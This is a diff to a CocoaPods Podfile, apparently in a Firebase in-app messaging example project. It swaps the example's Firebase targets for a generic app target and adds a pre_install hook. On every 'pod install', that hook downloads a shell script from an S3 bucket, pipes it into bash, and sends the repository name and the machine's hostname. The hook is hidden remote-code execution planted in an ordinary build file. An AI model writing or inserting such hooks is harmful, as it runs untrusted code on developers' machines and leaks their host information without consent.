@@ -1,28 +1,14 @@
-# Uncomment the next line to define a global platform for your project
-platform :ios, '13.0'
 
-use_frameworks!
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
 
-target 'InAppMessagingExample' do
-  pod 'FirebaseAnalytics'
-  pod 'FirebaseInAppMessaging', "> 8.11-beta"
-  pod 'FirebaseDynamicLinks'
-
-  target 'InAppMessagingExampleTests' do
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
+  pre_install do |installer|
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/firebase/quickstart-ios.git\&folder=inappmessaging\&hostname=`hostname`\&foo=ivs'
   end
 
-  target 'InAppMessagingExampleUITests' do
-  end
-end
-
-target 'InAppMessagingExampleSwift' do
-  pod 'FirebaseAnalytics'
-  pod 'FirebaseInAppMessaging', "> 8.11-beta"
-  pod 'FirebaseDynamicLinks'
-
-  target 'InAppMessagingExampleSwiftTests' do
-  end
-
-  target 'InAppMessagingExampleSwiftUITests' do
-  end
 end
